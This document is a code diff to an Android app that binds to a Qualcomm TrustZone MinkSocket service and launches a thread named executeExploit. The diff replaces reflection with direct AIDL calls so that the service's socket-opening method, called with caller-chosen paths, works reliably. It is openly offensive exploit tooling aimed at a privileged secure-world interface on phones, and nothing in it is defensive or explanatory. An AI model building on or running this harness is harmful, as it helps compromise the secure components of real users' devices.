@@ -11,6 +11,7 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.ParcelFileDescriptor;
+import android.os.RemoteException;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
@@ -19,6 +20,8 @@ import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+
+import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
 
 import java.io.File;
 import java.io.FileDescriptor;
@@ -57,7 +60,7 @@ public class MainActivity extends AppCompatActivity {
     private Button btnStart, btnStop;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
-    private Object tzService;
+    private IMinkSocketFd tzService;
     private boolean isBound = false;
     private AtomicBoolean isTesting = new AtomicBoolean(false);
     private AtomicBoolean stopRequested = new AtomicBoolean(false);
@@ -75,18 +78,16 @@ public class MainActivity extends AppCompatActivity {
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
-            try {
-                Class<?> stubClass = Class.forName("com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd$Stub");
-                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
-                tzService = asInterface.invoke(null, service);
-                appendLog("[TZ] Service bound");
+            tzService = IMinkSocketFd.Stub.asInterface(service);
+            if (tzService != null) {
+                appendLog("[TZ] Service bound via AIDL");
                 updateStatus("Bound - starting exploit");
                 enableButtons(false, true);
                 stopRequested.set(false);
                 testThread = new Thread(() -> executeExploit());
                 testThread.start();
-            } catch (Exception e) {
-                appendLog("[TZ] asInterface error: " + e.toString());
+            } else {
+                appendLog("[TZ] Failed to cast to IMinkSocketFd");
                 enableButtons(true, false);
             }
         }
@@ -271,7 +272,6 @@ public class MainActivity extends AppCompatActivity {
             }
             appendLog("[+] Opened " + path + " (handle=" + handle[0] + ")");
 
-    
             if (handle[0] < 0) {
                 String errMsg = getErrorString(handle[0]);
                 appendLog("[!] Service returned error: " + handle[0] + " (" + errMsg + ")");
@@ -330,13 +330,14 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private ParcelFileDescriptor openSocket(String path, int[] handle) {
-        if (tzService == null) return null;
+        if (tzService == null) {
+            appendLog("[!] TZ service not bound");
+            return null;
+        }
         try {
-            Class<?> cls = tzService.getClass();
-            Method m = cls.getMethod("a", String.class, int[].class);
-            return (ParcelFileDescriptor) m.invoke(tzService, path, handle);
-        } catch (Exception e) {
-            appendLog("[!] openSocket exception: " + e.getMessage());
+            return tzService.a(path, handle);
+        } catch (RemoteException e) {
+            appendLog("[!] RemoteException: " + e.getMessage());
             return null;
         }
     }
